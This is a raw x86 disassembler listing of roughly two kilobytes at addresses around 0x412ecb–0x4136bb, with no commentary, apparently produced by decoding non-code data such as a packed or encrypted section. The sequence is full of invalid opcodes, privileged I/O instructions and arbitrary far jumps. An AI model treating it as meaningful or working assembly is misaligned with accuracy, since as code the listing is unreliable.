  412ecb:	scas   al,BYTE PTR es:[edi]
  412ecc:	clc    
  412ecd:	sub    al,0xe
  412ecf:	dec    eax
  412ed0:	pop    ss
  412ed1:	outs   dx,DWORD PTR ds:[esi]
  412ed2:	fmul   QWORD PTR [edi+0x6]
  412ed5:	dec    esp
  412ed6:	add    al,0x7e
  412ed8:	hlt    
  412ed9:	repz cmp eax,esp
  412edc:	cwde   
  412edd:	outs   dx,BYTE PTR ds:[esi]
  412ede:	jns    0x412e6a
  412ee0:	fsubrp st(7),st
  412ee2:	cwde   
  412ee3:	hlt    
  412ee4:	int3   
  412ee5:	or     bl,bl
  412ee7:	jnp    0x412eba
  412ee9:	or     dh,ch
  412eeb:	gs mov esi,0xe5347673
  412ef1:	and    al,0x1a
  412ef3:	test   dh,dl
  412ef5:	retf   0xfca9
  412ef8:	xchg   esi,eax
  412ef9:	cmp    eax,0x9255895d
  412efe:	inc    edi
  412eff:	xor    BYTE PTR [edx-0x4c0bc651],al
  412f05:	inc    esp
  412f06:	sti    
  412f07:	jbe    0x412eee
  412f09:	pop    ebx
  412f0a:	out    dx,eax
  412f0b:	mov    edx,0xf2ae8b8f
  412f10:	hlt    
  412f11:	cmp    al,0xe7
  412f13:	xchg   ebx,eax
  412f14:	iret   
  412f15:	or     cl,BYTE PTR [eax-0x66d2eca5]
  412f1b:	push   ecx
  412f1c:	retf   
  412f1d:	or     al,0x62
  412f1f:	scas   eax,DWORD PTR es:[edi]
  412f20:	pop    ebp
  412f21:	sbb    al,0x9a
  412f23:	mov    WORD PTR [esi-0x47101cb5],es
  412f29:	cdq    
  412f2a:	inc    eax
  412f2b:	dec    cl
  412f2d:	sub    BYTE PTR [edi+ebp*2+0x4d],ah
  412f31:	sti    
  412f32:	outs   dx,BYTE PTR ds:[esi]
  412f33:	ins    DWORD PTR es:[edi],dx
  412f34:	pop    esi
  412f35:	sbb    BYTE PTR [ebp-0x3a6d91d0],0xcb
  412f3c:	das    
  412f3d:	shl    dh,cl
  412f3f:	jo     0x412ed4
  412f41:	push   ecx
  412f42:	mov    edi,0xf293d71a
  412f47:	(bad)  
  412f48:	sbb    al,0x88
  412f4a:	mov    ds:0xb21267d6,al
  412f4f:	fwait
  412f50:	pushf  
  412f51:	sbb    DWORD PTR [edx+0x3668c699],ebp
  412f57:	xor    eax,0x4083372d
  412f5c:	repz (bad) 
  412f5e:	lahf   
  412f5f:	dec    esi
  412f60:	mov    al,ds:0xe5bff65c
  412f65:	adc    eax,0x8b795dde
  412f6a:	ret    
  412f6b:	icebp  
  412f6c:	(bad)
  412f70:	sbb    eax,0xbd30907c
  412f75:	jno    0x412f70
  412f77:	mov    ebp,0x2788cc66
  412f7c:	lods   eax,DWORD PTR ds:[esi]
  412f7d:	hlt    
  412f7e:	jg     0x412fe6
  412f80:	jle    0x412fb7
  412f82:	icebp  
  412f83:	arpl   WORD PTR [ebp+0x10],bp
  412f86:	(bad)  
  412f87:	in     eax,0x1c
  412f89:	stos   BYTE PTR es:[edi],al
  412f8a:	loopne 0x412fa0
  412f8c:	pop    ebx
  412f8d:	mov    ds:0x5d7dea2c,eax
  412f92:	addr16 and eax,0x5f07fc37
  412f98:	retf   0xee95
  412f9b:	and    cl,BYTE PTR [ecx+0x50b41a8]
  412fa1:	cmp    eax,0xc1a90bb6
  412fa6:	mov    ebx,0xc85655ca
  412fab:	shl    BYTE PTR [edx],0xa5
  412fae:	rcr    BYTE PTR [edx+0x1ef6bfa5],cl
  412fb4:	fidiv  DWORD PTR [esi+0x44e8c47]
  412fba:	jmp    0xc671:0x808ef80f
  412fc1:	push   es
  412fc2:	mov    edi,0xb2cc913e
  412fc7:	call   0x1866:0x1f136fb1
  412fce:	loop   0x412fb3
  412fd0:	lods   al,BYTE PTR ds:[esi]
  412fd1:	ins    BYTE PTR es:[edi],dx
  412fd2:	inc    edi
  412fd3:	scas   al,BYTE PTR es:[edi]
  412fd4:	mov    DWORD PTR [ebx-0x28590652],edi
  412fda:	mov    ch,0x38
  412fdc:	mov    ecx,DWORD PTR [edx-0xc]
  412fdf:	(bad)  
  412fe0:	and    edx,esi
  412fe2:	sahf   
  412fe3:	(bad)  
  412fe4:	pop    edi
  412fe5:	out    0x33,eax
  412fe7:	pop    ebp
  412fe8:	(bad)  
  412fe9:	adc    cl,BYTE PTR [edi]
  412feb:	imul   esi,DWORD PTR [edx+0x15],0x75c8548
  412ff2:	pop    edx
  412ff3:	bound  esi,QWORD PTR [esp+edx*2]
  412ff6:	push   0x646481d6
  412ffb:	inc    edx
  412ffc:	add    al,0xc3
  412ffe:	and    bh,BYTE PTR [ebx-0x9a48769]
  413004:	push   edx
  413005:	int3   
  413006:	aas    
  413007:	rcl    DWORD PTR [esi+eiz*1-0x12a2337f],cl
  41300e:	cmp    eax,esp
  413010:	jp     0x412f99
  413012:	sbb    edx,DWORD PTR [ebx]
  413014:	pop    ds
  413015:	xor    eax,0xa9861cb4
  41301a:	sub    al,0x3
  41301c:	xlat   BYTE PTR ds:[ebx]
  41301d:	mov    cs,edi
  41301f:	adc    BYTE PTR [eax+0x24],0xc
  413023:	shl    ecx,0xaa
  413026:	jmp    0x19a7c49f
  41302b:	stos   BYTE PTR es:[edi],al
  41302c:	mov    dl,0x96
  41302e:	mov    DWORD PTR [ebx-0xf48b8a7],eax
  413034:	fist   DWORD PTR [edi+esi*1+0x4]
  413038:	add    ch,al
  41303a:	jae    0x412fcd
  41303c:	cmovne eax,DWORD PTR ds:0xe191961e
  413043:	sbb    eax,0xb6a4a85
  413048:	ja     0x413050
  41304a:	mov    esp,0xea72724d
  41304f:	sub    BYTE PTR [eax+0x1506077],al
  413055:	fs (bad) 
  413057:	int    0x36
  413059:	je     0x413026
  41305b:	loope  0x413051
  41305d:	call   0x3839beae
  413062:	gs mov cl,0x97
  413065:	fs cs mov ecx,0xf5aa4f40
  41306c:	inc    edx
  41306d:	pop    ebp
  41306e:	sub    BYTE PTR [esi-0x49],ch
  413071:	aaa    
  413072:	xor    eax,0x7398154a
  413077:	into   
  413078:	sar    DWORD PTR [esi+0x6bd7ab34],1
  41307e:	out    dx,al
  41307f:	and    ebx,edx
  413081:	mov    esi,DWORD PTR [esi]
  413083:	test   eax,0xce258e0e
  413088:	sti    
  413089:	add    dh,ch
  41308b:	data16 out dx,al
  41308d:	adc    al,0xa3
  41308f:	sbb    BYTE PTR [esi],al
  413091:	aam    0x56
  413093:	fmul   QWORD PTR [edx+0xb]
  413096:	lea    esp,[edx-0x57]
  413099:	sbb    ch,BYTE PTR ds:0xfbfcbc67
  41309f:	mov    esi,0x27d1a966
  4130a4:	das    
  4130a5:	xchg   esp,eax
  4130a6:	mul    BYTE PTR [eax+edi*2]
  4130a9:	inc    eax
  4130aa:	jo     0x413049
  4130ac:	push   cs
  4130ad:	pop    edx
  4130ae:	xchg   ebx,eax
  4130af:	scas   eax,DWORD PTR es:[edi]
  4130b0:	xor    BYTE PTR [ecx],cl
  4130b2:	mov    bl,bh
  4130b4:	or     eax,0x10a0ee3b
  4130b9:	fidivr WORD PTR [esi-0x4c0fae4]
  4130bf:	jmp    FWORD PTR [ebx+0x3484aea2]
  4130c5:	and    eax,DWORD PTR [eax-0x43b8684e]
  4130cb:	adc    ecx,DWORD PTR [edx+edx*8-0x649999ac]
  4130d2:	outs   dx,BYTE PTR ds:[esi]
  4130d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d4:	leave  
  4130d5:	clc    
  4130d6:	inc    edx
  4130d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d8:	ja     0x4130ff
  4130da:	cmc    
  4130db:	cmp    al,0x79
  4130dd:	add    ch,BYTE PTR [edx]
  4130df:	adc    eax,0xfd07540a
  4130e4:	mov    eax,0x172ca392
  4130e9:	repz xchg ebp,eax
  4130eb:	adc    cl,BYTE PTR [ebp+0x29]
  4130ee:	pop    ebx
  4130ef:	pop    esp
  4130f0:	test   eax,0x1185d108
  4130f5:	fmul   DWORD PTR [ebp-0x6]
  4130f8:	aad    0x64
  4130fa:	push   es
  4130fb:	call   0x7bbf3102
  413100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413101:	mov    edx,0x11ebfab8
  413106:	and    DWORD PTR [ebp+0x57],esi
  413109:	mov    al,ds:0x421c7841
  41310e:	sbb    esp,DWORD PTR [esp+ebx*4-0x4a1f2ba2]
  413115:	push   ss
  413116:	dec    ebx
  413117:	jb     0x41317f
  413119:	fprem  
  41311b:	fbstp  TBYTE PTR [edi]
  41311d:	xor    esi,ebx
  41311f:	push   ecx
  413120:	xlat   BYTE PTR ds:[ebx]
  413121:	sub    esi,0xfffffff8
  413124:	sub    ah,BYTE PTR [ebx]
  413126:	ret    
  413127:	add    al,0x48
  413129:	mov    ecx,0xe8dcdc4c
  41312e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41312f:	push   cs
  413130:	push   eax
  413131:	jb     0x4130f1
  413133:	push   ebx
  413134:	fst    QWORD PTR [ebx-0x6f7b46fb]
  41313a:	test   ebp,ebp
  41313c:	cdq    
  41313d:	retf   
  41313e:	cmp    al,dl
  413140:	scas   al,BYTE PTR es:[edi]
  413141:	out    dx,eax
  413142:	arpl   WORD PTR [esi+0x692844c6],si
  413148:	lds    esp,FWORD PTR [ebp+ebp*4-0x60]
  41314c:	rcr    BYTE PTR [edi],0x87
  41314f:	mov    ecx,ebp
  413151:	sbb    al,0x9d
  413153:	inc    ebx
  413154:	pop    ecx
  413155:	stos   BYTE PTR es:[edi],al
  413156:	mov    dh,0x89
  413158:	js     0x41310c
  41315a:	pop    ds
  41315b:	jno    0x41312d
  41315d:	pop    ss
  41315e:	jo     0x413160
  413160:	int    0xbb
  413162:	mov    ecx,0xab3cadbd
  413167:	dec    edx
  413168:	addr16 jl 0x4131d1
  41316b:	pop    ss
  41316c:	ins    BYTE PTR es:[edi],dx
  41316d:	mov    eax,0x3027a5dc
  413172:	(bad)  
  413173:	xchg   edi,eax
  413174:	fcomp  QWORD PTR [ecx+0x36f5fe9]
  41317a:	ja     0x41312c
  41317c:	addr16 mov esi,0xcf512a83
  413182:	mov    eax,es:0x7294000e
  413188:	inc    esp
  413189:	rcl    bl,cl
  41318b:	test   DWORD PTR [ebx],0x73bd406a
  413191:	aam    0xc1
  413193:	sbb    BYTE PTR [ebp+0x55],bl
  413196:	lock shl dh,1
  413199:	and    DWORD PTR es:[ebp+0x3b],esi
  41319d:	lahf   
  41319e:	rcr    BYTE PTR [ebx+esi*8+0x3c],0x86
  4131a3:	dec    eax
  4131a4:	pop    edx
  4131a5:	mov    ds:0x234c48f6,eax
  4131aa:	pusha  
  4131ab:	scas   eax,DWORD PTR es:[edi]
  4131ac:	add    ebp,DWORD PTR [edx-0x27]
  4131af:	(bad)  
  4131b0:	cmp    BYTE PTR [ecx+edx*1+0x3],al
  4131b4:	mov    ds:0xcd4eebd1,eax
  4131b9:	sub    edx,DWORD PTR [eax-0x14087c15]
  4131bf:	pushf  
  4131c0:	inc    esi
  4131c1:	loope  0x413195
  4131c3:	cs push esp
  4131c5:	aam    0x8f
  4131c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c8:	clc    
  4131c9:	dec    eax
  4131ca:	sub    eax,0xc3322565
  4131cf:	je     0x413193
  4131d1:	in     al,0xf0
  4131d3:	out    0x6f,eax
  4131d5:	scas   al,BYTE PTR es:[edi]
  4131d6:	repz (bad) 
  4131d8:	pop    eax
  4131d9:	pop    ds
  4131da:	xor    al,0x9f
  4131dc:	jne    0x413186
  4131de:	add    esp,DWORD PTR [esi]
  4131e0:	daa    
  4131e1:	test   ah,ch
  4131e3:	pop    ebp
  4131e4:	jb     0x4131c1
  4131e6:	ficomp DWORD PTR [ebx+0x17]
  4131e9:	hlt    
  4131ea:	jle    0x4131c3
  4131ec:	xchg   esp,eax
  4131ed:	or     ecx,DWORD PTR [edx+ebp*8+0x50]
  4131f1:	inc    esi
  4131f2:	std    
  4131f3:	cmp    DWORD PTR [ecx+0xbbfeb02],eax
  4131f9:	mov    edx,ecx
  4131fb:	dec    eax
  4131fc:	(bad)  
  4131fd:	mov    dh,0xcc
  4131ff:	call   0x818e6aec
  413204:	mov    eax,DWORD PTR [edi-0x7b]
  413207:	add    al,0xad
  413209:	loopne 0x413253
  41320b:	xor    al,0xd5
  41320d:	idiv   DWORD PTR [edi]
  41320f:	sub    eax,0x4ced036a
  413214:	or     BYTE PTR [edx+0x45],al
  413217:	push   edx
  413218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413219:	loop   0x4131e0
  41321b:	add    eax,DWORD PTR [ecx]
  41321d:	mov    edi,0x55b7714
  413222:	inc    edx
  413223:	dec    edi
  413224:	dec    ebx
  413225:	in     al,0xa4
  413227:	add    al,0x4e
  413229:	inc    edi
  41322a:	cdq    
  41322b:	or     eax,0xf5924367
  413230:	js     0x41325d
  413232:	(bad)
  413236:	mov    edx,0xbef248d4
  41323b:	arpl   di,sp
  41323d:	stos   BYTE PTR es:[edi],al
  41323e:	cli    
  41323f:	mov    bh,0x7f
  413241:	std    
  413242:	and    dl,BYTE PTR [esi]
  413244:	pop    es
  413245:	or     ah,BYTE PTR [ebp+0x7ea6276c]
  41324b:	lahf   
  41324c:	mov    eax,0xd37b6fa6
  413251:	pop    ds
  413252:	ret    0xb1ed
  413255:	fnstcw WORD PTR [ecx+0x6325cb93]
  41325b:	xchg   ecx,eax
  41325c:	add    eax,0x1c5d3088
  413261:	aaa    
  413262:	and    ch,BYTE PTR [edi-0x6fd83939]
  413268:	outs   dx,DWORD PTR ds:[esi]
  413269:	rcr    DWORD PTR [ebx+0x72],0xe2
  41326d:	or     eax,0x3079ac8
  413272:	jl     0x4131f9
  413274:	ins    BYTE PTR es:[edi],dx
  413275:	aaa    
  413276:	fs dec edx
  413278:	pop    eax
  413279:	mov    edi,?
  41327b:	out    0xe7,al
  41327d:	add    dh,BYTE PTR [edi+0x46]
  413280:	cmc    
  413281:	cmp    bh,cl
  413283:	sub    dl,BYTE PTR [esi-0x27]
  413286:	repnz adc al,0xa4
  413289:	arpl   WORD PTR [ebp-0x5d],si
  41328c:	cli    
  41328d:	push   ds
  41328e:	mov    bl,0xa8
  413290:	push   edx
  413291:	enter  0x15b7,0xca
  413295:	inc    ebp
  413296:	cmp    BYTE PTR [edx-0x7c],dh
  413299:	pop    ds
  41329a:	inc    esi
  41329b:	mov    ebp,0xf438435b
  4132a0:	mov    bh,0xb2
  4132a2:	push   es
  4132a3:	aaa    
  4132a4:	(bad)  
  4132a5:	jmp    0x5c5cd3b
  4132aa:	mov    bh,0x9e
  4132ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132ad:	dec    eax
  4132ae:	aas    
  4132af:	cld    
  4132b0:	fcom   DWORD PTR [edx+0x643f32bd]
  4132b6:	cmp    ch,cl
  4132b8:	cmp    BYTE PTR [edi],dl
  4132ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132bb:	xchg   ebx,eax
  4132bc:	(bad)  
  4132bd:	in     eax,0x58
  4132bf:	cmp    DWORD PTR [ebx],eax
  4132c1:	bound  edx,QWORD PTR [eax]
  4132c3:	loop   0x4132a1
  4132c5:	fisubr DWORD PTR [ecx-0x203fee79]
  4132cb:	hlt    
  4132cc:	lock sub eax,0x734f6965
  4132d2:	xchg   ebp,eax
  4132d3:	push   edx
  4132d4:	sbb    ebx,DWORD PTR [ebx-0x170e6c67]
  4132da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132db:	dec    ecx
  4132dc:	fwait
  4132dd:	or     dh,BYTE PTR [edx]
  4132df:	mov    ah,0x92
  4132e1:	ret    
  4132e2:	cs cmp al,0xe9
  4132e5:	fiadd  DWORD PTR [esi+eax*1+0x1]
  4132e9:	push   edx
  4132ea:	xchg   ebp,eax
  4132eb:	div    DWORD PTR [esi+eax*2+0x4e87cd29]
  4132f2:	mov    cl,0x50
  4132f4:	dec    edi
  4132f5:	cmp    al,0xee
  4132f7:	sbb    al,0xe2
  4132f9:	jg     0x41329e
  4132fb:	push   es
  4132fc:	mov    cl,0xf5
  4132fe:	test   eax,0xd5eaf734
  413303:	iret   
  413304:	push   ecx
  413305:	push   0x61
  413307:	dec    edx
  413308:	sub    BYTE PTR [esp+ebp*2-0xd],dh
  41330c:	jg     0x413381
  41330e:	adc    edi,eax
  413310:	sub    eax,0xbe08a29f
  413315:	popf   
  413316:	xor    bh,BYTE PTR [ebp-0x620e5559]
  41331c:	das    
  41331d:	pop    ecx
  41331e:	inc    ecx
  41331f:	fisub  WORD PTR [ecx-0x4f71c0e1]
  413325:	call   0x553:0xf0ed2338
  41332c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332d:	pop    es
  41332e:	repnz fldln2 
  413331:	sub    al,0xa0
  413333:	sub    eax,0x7eed35fd
  413338:	ds in  al,dx
  41333a:	mov    ebp,0xf8f80e6b
  41333f:	and    dl,bh
  413341:	pop    es
  413342:	xor    DWORD PTR [edi+0x1e4c76f5],0x2c62c290
  41334c:	mov    ah,0x28
  41334e:	mov    esi,0xdc983703
  413353:	jp     0x413398
  413355:	aad    0x2
  413357:	ror    DWORD PTR [edi],0x68
  41335a:	(bad)  
  41335b:	xor    DWORD PTR [ebx],esp
  41335d:	pop    edi
  41335e:	xchg   edx,eax
  41335f:	pop    ds
  413360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413361:	arpl   WORD PTR [esi+0x72811d9b],cx
  413367:	mov    eax,ds:0xa3d211d2
  41336c:	cmp    eax,0x892ed504
  413371:	addr16 jmp 0xeadd:0x46c7dca9
  413379:	dec    esp
  41337a:	jmp    0xcdc34886
  41337f:	add    dl,al
  413381:	test   DWORD PTR [edx-0x68],esi
  413384:	inc    esp
  413385:	push   esi
  413386:	jb     0x4133ab
  413388:	dec    esp
  413389:	imul   esp,ebp,0xeb102112
  41338f:	mov    edx,0x9d2333bb
  413394:	mov    ebp,0x84383318
  413399:	mov    al,ds:0x8f91dcd1
  41339e:	adc    ecx,esp
  4133a0:	add    ah,0x60
  4133a3:	call   0xe895:0x49107bf0
  4133aa:	retf   
  4133ab:	fisubr DWORD PTR [edi+eax*4+0x31]
  4133af:	(bad)  
  4133b0:	sbb    al,BYTE PTR [ecx-0xd44dd2e]
  4133b6:	adc    DWORD PTR [eax-0x73],ecx
  4133b9:	push   esi
  4133ba:	in     eax,dx
  4133bb:	xchg   edx,eax
  4133bc:	pop    ss
  4133bd:	mov    dh,0x2a
  4133bf:	mov    ecx,0x1f9af1b
  4133c4:	push   ebp
  4133c5:	lea    ecx,[ebp*4+0x17cef1eb]
  4133cc:	popa   
  4133cd:	pop    ebx
  4133ce:	test   BYTE PTR [esi+0x4b],al
  4133d1:	and    esp,edi
  4133d3:	in     al,dx
  4133d4:	addr16 sbb cl,0x54
  4133d8:	ror    BYTE PTR [ebp-0x20],0xc8
  4133dc:	out    0xa2,eax
  4133de:	push   esp
  4133df:	(bad)  
  4133e0:	lock imul ebp,edi,0xbd25c448
  4133e7:	(bad)  
  4133e8:	adc    DWORD PTR [edx],eax
  4133ea:	ret    
  4133eb:	mov    al,ds:0xc1ecea6f
  4133f0:	call   0xa77c17f7
  4133f5:	push   eax
  4133f6:	jmp    0x9a60821e
  4133fb:	jns    0x4133be
  4133fd:	pushf  
  4133fe:	pop    ds
  4133ff:	neg    BYTE PTR [esi-0x4a]
  413402:	mov    BYTE PTR [edx],bh
  413404:	fcomp  QWORD PTR [edx+edx*2]
  413407:	xor    edi,esi
  413409:	cmp    ecx,DWORD PTR ds:0x22865730
  41340f:	pop    ds
  413410:	shl    bl,0xd0
  413413:	nop
  413414:	jnp    0x4133fd
  413416:	xor    DWORD PTR [edi+0x719fdab7],edx
  41341c:	sbb    DWORD PTR [ecx],ebx
  41341e:	out    dx,eax
  41341f:	cdq    
  413420:	or     al,0x76
  413422:	adc    eax,0xba93b89e
  413427:	outs   dx,BYTE PTR ds:[esi]
  413428:	dec    ebp
  413429:	ret    0xe7fe
  41342c:	push   0x98533e90
  413431:	push   0xffffff9f
  413433:	test   BYTE PTR [ecx-0x546a1830],bl
  413439:	xor    BYTE PTR [edi-0x61],cl
  41343c:	inc    eax
  41343d:	xchg   DWORD PTR [ebx],ecx
  41343f:	jmp    DWORD PTR [ebx-0x4842519]
  413445:	clc    
  413446:	je     0x4134be
  413448:	in     eax,0xab
  41344a:	aam    0x39
  41344c:	lods   al,BYTE PTR ds:[esi]
  41344d:	pushf  
  41344e:	inc    esp
  41344f:	xor    bh,ch
  413451:	add    DWORD PTR [eax],ebx
  413453:	imul   esp,DWORD PTR [edx],0x1e15b102
  413459:	fwait
  41345a:	dec    ah
  41345c:	and    DWORD PTR [eax-0x13],edi
  41345f:	out    0xbc,eax
  413461:	out    0x49,al
  413463:	hlt    
  413464:	out    0xe8,al
  413466:	dec    eax
  413467:	inc    edx
  413468:	adc    esp,DWORD PTR [ecx]
  41346a:	mov    dh,0xb7
  41346c:	push   ebx
  41346d:	test   eax,0x9545ac6
  413472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413473:	sbb    ch,BYTE PTR [eax+0x611ef95f]
  413479:	ja     0x4134d0
  41347b:	addr16 inc edi
  41347d:	mov    dl,BYTE PTR [esi+0x4af8e906]
  413483:	fisttp DWORD PTR [ecx+0x1d3210bb]
  413489:	shl    BYTE PTR [esp+ecx*2],cl
  41348c:	dec    edi
  41348d:	lock rcr DWORD PTR [esi],cl
  413490:	stc    
  413491:	addr16 mov ebp,0x663a9d3e
  413497:	div    BYTE PTR [ecx+eiz*1+0x79f42542]
  41349e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41349f:	bound  edx,QWORD PTR [ecx+ebx*2]
  4134a2:	adc    BYTE PTR [ebx+ebx*2+0x4d],dl
  4134a6:	sti    
  4134a7:	ret    0x4345
  4134aa:	retf   
  4134ab:	popa   
  4134ac:	imul   ebx,DWORD PTR [ecx+0x586add4f],0x54
  4134b3:	jae    0x41351b
  4134b5:	lock adc dh,BYTE PTR [ebp-0x3115522b]
  4134bc:	out    dx,eax
  4134bd:	pop    ebx
  4134be:	push   esi
  4134bf:	imul   eax,DWORD PTR [ecx],0x4e
  4134c2:	jnp    0x4134ea
  4134c4:	aaa    
  4134c5:	je     0x4134ab
  4134c7:	mov    edi,DWORD PTR [ebx]
  4134c9:	loop   0x413466
  4134cb:	sti    
  4134cc:	push   ebp
  4134cd:	mov    edx,DWORD PTR [esi+0x2d59c578]
  4134d3:	rol    al,1
  4134d5:	sub    BYTE PTR ds:0xad237c91,al
  4134db:	fidivr WORD PTR [edx]
  4134dd:	lahf   
  4134de:	and    DWORD PTR [esi-0x77],ecx
  4134e1:	mov    cl,BYTE PTR [ecx]
  4134e3:	stc    
  4134e4:	mov    edi,0x6637c98
  4134e9:	fs push 0x69
  4134ec:	ret    
  4134ed:	call   0xe3e4:0x3626234
  4134f4:	outs   dx,DWORD PTR ds:[esi]
  4134f5:	shr    esp,1
  4134f7:	mov    DWORD PTR [eax+ebx*2],eax
  4134fa:	aad    0xf8
  4134fc:	xchg   ebp,eax
  4134fd:	into   
  4134fe:	add    BYTE PTR [edx-0x10],bh
  413501:	push   eax
  413502:	inc    ecx
  413503:	fist   DWORD PTR [ecx+ebx*4-0x4ae9066e]
  41350a:	imul   esp,DWORD PTR [eax+ebx*8+0x2c],0xb8448cea
  413512:	in     al,dx
  413513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413514:	fisttp WORD PTR [eax+0x37]
  413517:	push   edx
  413518:	iret   
  413519:	js     0x41353f
  41351b:	mov    bh,0xcf
  41351d:	and    ebx,DWORD PTR [ecx-0x4e42f049]
  413523:	call   0xc30025d1
  413528:	push   ss
  413529:	sbb    edi,DWORD PTR [ebp+0x52]
  41352c:	or     al,0x8a
  41352e:	pop    eax
  41352f:	in     al,dx
  413530:	inc    edx
  413531:	pop    ecx
  413532:	loopne 0x413558
  413534:	sar    BYTE PTR [esi+0x22234afc],1
  41353a:	enter  0x6af7,0x5f
  41353e:	and    esp,ebp
  413540:	adc    eax,0x86e065ad
  413545:	push   ss
  413546:	jg     0x4134d2
  413548:	mov    bl,0x4
  41354a:	fucomi st,st(0)
  41354c:	scas   al,BYTE PTR es:[edi]
  41354d:	jno    0x4135ba
  41354f:	mov    bh,0x2c
  413551:	rcr    BYTE PTR [eax+0x6264768f],1
  413557:	stos   BYTE PTR es:[edi],al
  413558:	mov    ebp,0x4653662f
  41355d:	add    ah,BYTE PTR [edx+edx*4+0x3eb2e285]
  413564:	cmp    dl,BYTE PTR [edi+0x1e8906cd]
  41356a:	fidivr WORD PTR [edx+0x72f51450]
  413570:	fst    QWORD PTR [edi-0x69fe7d0c]
  413576:	adc    al,0x4c
  413578:	add    ch,bh
  41357a:	pop    ebp
  41357b:	dec    ebp
  41357c:	dec    ebx
  41357d:	and    ebp,DWORD PTR [esi-0x1b]
  413580:	lods   al,BYTE PTR ds:[esi]
  413581:	and    BYTE PTR [edx],ah
  413583:	cmp    BYTE PTR [edx+ebx*1+0x62],bl
  413587:	mov    eax,0x82d24b9d
  41358c:	cmp    eax,0x5c8eb651
  413591:	fisubr DWORD PTR [esi-0x71]
  413594:	retf   
  413595:	outs   dx,DWORD PTR ds:[esi]
  413596:	or     dl,ah
  413598:	out    dx,eax
  413599:	sti    
  41359a:	popf   
  41359b:	sti    
  41359c:	test   al,0xaf
  41359e:	cmp    edx,DWORD PTR [esi+edx*8-0x11e2a950]
  4135a5:	ins    BYTE PTR es:[di],dx
  4135a7:	and    ecx,DWORD PTR [ecx]
  4135a9:	(bad)
  4135ad:	or     al,0x98
  4135af:	imul   ecx,DWORD PTR [eax],0xffffff96
  4135b2:	shr    BYTE PTR [ebx+edi*1-0x46],cl
  4135b6:	xchg   ecx,eax
  4135b7:	pop    ebx
  4135b8:	fimul  DWORD PTR [edi+0x1d]
  4135bb:	outs   dx,DWORD PTR ds:[esi]
  4135bc:	ret    0xee54
  4135bf:	mov    ds,WORD PTR [ebp+edx*4-0x78]
  4135c3:	int3   
  4135c4:	push   0x25
  4135c6:	mov    WORD PTR [ebx+ebx*4+0x4dc80fa4],cs
  4135cd:	test   BYTE PTR [edx+0x5c],ah
  4135d0:	mov    ebx,0xd42b4229
  4135d5:	pop    edx
  4135d6:	fs dec esp
  4135d8:	and    eax,0x501454d8
  4135dd:	xchg   ebx,eax
  4135de:	adc    al,0xf8
  4135e0:	sbb    al,0xcb
  4135e2:	call   0xa5bc014c
  4135e7:	push   edx
  4135e8:	push   edx
  4135e9:	pop    es
  4135ea:	mov    esi,0xb2aeca09
  4135ef:	test   al,0xf1
  4135f1:	in     eax,0x48
  4135f3:	or     edi,DWORD PTR [ebp+0x33]
  4135f6:	xchg   BYTE PTR [edi-0xa],al
  4135f9:	ret    
  4135fa:	jg     0x4135d9
  4135fc:	sbb    BYTE PTR [ecx-0x67e72d2a],0xe2
  413603:	test   al,0x99
  413605:	xchg   ebp,eax
  413606:	stc    
  413607:	aam    0xe2
  413609:	fadd   DWORD PTR [edi+esi*2]
  41360c:	div    DWORD PTR [edi+0x18ed3654]
  413612:	test   eax,esp
  413614:	nop
  413615:	mov    cl,0xe
  413617:	xchg   ebp,eax
  413618:	sbb    al,0x44
  41361a:	test   bh,bh
  41361c:	cmp    BYTE PTR [ecx-0x68],bl
  41361f:	xor    eax,0x5eefee84
  413624:	xor    al,0xb5
  413626:	repnz or al,0x24
  413629:	xor    DWORD PTR [edi],ecx
  41362b:	dec    edx
  41362c:	mov    WORD PTR [esp+ecx*8],?
  41362f:	outs   dx,BYTE PTR ds:[esi]
  413630:	ja     0x4135bf
  413632:	sub    dh,ah
  413634:	jnp    0x4135ff
  413636:	sbb    edi,DWORD PTR [esi-0x3e]
  413639:	pushf  
  41363a:	enter  0x2c41,0x9f
  41363e:	xchg   BYTE PTR [eax-0x278170d4],al
  413644:	sbb    BYTE PTR [ebx-0xbaf64df],ch
  41364a:	(bad)  
  41364b:	repz pusha 
  41364d:	daa    
  41364e:	(bad)  
  413650:	adc    al,0xc8
  413652:	xor    esp,DWORD PTR [ecx+eax*4]
  413655:	push   es
  413656:	sub    al,0x2f
  413658:	dec    eax
  413659:	(bad)  
  41365a:	das    
  41365b:	inc    ecx
  41365c:	mov    esi,0xb9bb5b4f
  413661:	test   esp,esp
  413663:	dec    eax
  413664:	arpl   WORD PTR [esi-0x16],sp
  413667:	sar    edx,cl
  413669:	dec    edx
  41366a:	imul   ebp,DWORD PTR [esi],0x3c
  41366d:	mov    esp,0xbe257c77
  413672:	xchg   esi,eax
  413673:	inc    esi
  413674:	push   esp
  413675:	popf   
  413676:	call   0x7663:0xd5b94925
  41367d:	xchg   edi,eax
  41367e:	call   0x82c0bec8
  413683:	aad    0x3e
  413685:	cmp    esi,DWORD PTR [eax-0x5b]
  413688:	fs push es
  41368a:	inc    esi
  41368b:	sbb    al,0x1b
  41368d:	sar    DWORD PTR [ecx+edi*8],0x96
  413691:	cmp    dh,al
  413693:	test   al,0x23
  413695:	repnz shl eax,0x11
  413699:	ss mov al,0xc0
  41369c:	imul   ecx,DWORD PTR [eax+ecx*4],0x45f7722b
  4136a3:	jl     0x4136e8
  4136a5:	or     BYTE PTR [edx],0x48
  4136a8:	pop    edx
  4136a9:	xor    cl,bl
  4136ab:	pop    eax
  4136ac:	div    DWORD PTR [ecx]
  4136ae:	aam    0x55
  4136b0:	push   eax
  4136b1:	mov    ds:0x71522c9c,eax
  4136b6:	adc    DWORD PTR [ebp+0x63],esp
  4136b9:	sbb    al,0x5a
  4136bb:	arpl   WORD PTR [esi],ax
